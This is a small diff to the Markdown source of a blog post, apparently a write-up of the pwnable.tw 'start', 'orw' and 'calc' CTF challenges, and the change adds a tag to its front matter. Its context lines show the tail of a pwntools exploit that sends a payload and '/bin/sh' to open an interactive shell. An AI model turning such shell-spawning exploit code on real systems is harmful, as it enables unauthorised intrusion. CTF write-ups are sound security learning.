@@ -2,6 +2,7 @@
 layout: post
 title: pwnable.tw start/orw/calc
 date: 2022-08-03 20:10:47
+tags: pwnable.tw
 ---
 
 ## start
@@ -192,3 +193,5 @@ p.sendline(payload)
 p.send(b'/bin/sh\x00')
 p.interactive()
 ```
+
+
